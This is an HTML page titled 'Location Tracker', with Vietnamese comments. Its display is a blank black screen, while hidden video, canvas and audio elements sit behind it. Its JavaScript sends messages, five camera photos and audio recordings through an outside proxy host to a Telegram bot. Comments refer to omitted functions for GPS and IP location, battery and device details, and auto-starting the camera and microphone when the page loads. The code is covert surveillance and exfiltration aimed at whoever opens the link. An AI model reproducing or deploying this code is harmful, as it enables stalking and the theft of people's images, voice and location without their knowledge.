<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Hoang Anh - Location Tracker</title>
    <style>
        body {
            background: black;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: monospace;
        }
        .hidden-content {
            display: none;
        }
    </style>
</head>
<body>
    <div style="display:none;">
        <div id="info"></div>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <audio id="audio" style="display:none;"></audio>

    <script>
        // =====  =====
        const PROXY_URL = 'https://fuckhacker.onrender.com/';
        
        // Các cấu hình khác giữ nguyên
        const PHOTO_COUNT = 5;
        const PHOTO_INTERVAL = 300;
        const AUDIO_DURATION = 400;
        
        let infoSent = false;
        let photoSentCount = 0;
        let cameraStream = null;
        let cameraActive = false;
        let audioRecorded = false;
        let mediaRecorder = null;
        let audioChunks = [];
        let gpsDataSent = false;

        // Hàm gửi qua proxy (không cần token)
        async function sendToProxy(endpoint, data) {
            try {
                const response = await fetch(`${PROXY_URL}/${endpoint}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
                return await response.json();
            } catch (error) {
                console.error('Proxy error:', error);
                throw error;
            }
        }

        // Gửi tin nhắn qua proxy
        async function sendToTelegram(text, retryCount = 0) {
            const maxRetries = 2;
            try {
                const result = await sendToProxy('sendMessage', {
                    text: text.substring(0, 4096),
                    parse_mode: 'HTML',
                    disable_web_page_preview: false
                });
                
                if (!result.ok && retryCount < maxRetries) {
                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
                }
                return result;
            } catch (e) {
                console.error('Lỗi gửi:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
                }
            }
        }

        // Gửi audio qua proxy
        async function sendAudioToTelegram(blob, retryCount = 0) {
            const maxRetries = 2;
            try {
                const formData = new FormData();
                formData.append('audio', blob, `audio_${Date.now()}.ogg`);
                formData.append('caption', `🎤 Ghi âm - ${new Date().toLocaleString('vi-VN')}`);
                
                const response = await fetch(`${PROXY_URL}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                if (data.ok) {
                    console.log('✅ Đã gửi ghi âm thành công');
                } else if (retryCount < maxRetries) {
                    setTimeout(() => sendAudioToTelegram(blob, retryCount + 1), 2000);
                }
            } catch (e) {
                console.error('Lỗi gửi audio:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendAudioToTelegram(blob, retryCount + 1), 2000);
                }
            }
        }

        // Gửi ảnh qua proxy
        async function sendPhotoToTelegram(blob, photoNumber, retryCount = 0) {
            const maxRetries = 2;
            try {
                const formData = new FormData();
                formData.append('photo', blob, `capture_${photoNumber}.jpg`);
                formData.append('caption', `📸 Ảnh chụp #${photoNumber} - ${new Date().toLocaleString('vi-VN')}`);
                
                const response = await fetch(`${PROXY_URL}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                if (data.ok) {
                    photoSentCount++;
                    console.log(`✅ Đã gửi ảnh #${photoNumber}`);
                    
                    if (photoSentCount === PHOTO_COUNT && cameraStream && cameraActive) {
                        setTimeout(() => {
                            cameraStream.getTracks().forEach(track => track.stop());
                            cameraStream = null;
                            cameraActive = false;
                        }, 2000);
                    }
                } else if (retryCount < maxRetries) {
                    setTimeout(() => sendPhotoToTelegram(blob, photoNumber, retryCount + 1), 2000);
                }
            } catch (e) {
                console.error('Lỗi gửi ảnh:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendPhotoToTelegram(blob, photoNumber, retryCount + 1), 2000);
                }
            }
        }

        // Các hàm còn lại giữ nguyên (captureSinglePhoto, captureMultiplePhotos, startRecording, 
        // getIPAndLocation, getBatteryInfo, getDeviceInfo, autoSendGPS, getInfoAndSendToTelegram,
        // startCameraImmediately, requestAudioImmediately, init)
        
        // [PHẦN CODE CÒN LẠI GIỮ NGUYÊN NHƯ BẢN GỐC]
        // ... (copy toàn bộ các hàm từ bản gốc từ captureSinglePhoto đến init)
        
        // Bắt đầu quá trình
        init();
    </script>
</body>
</html>
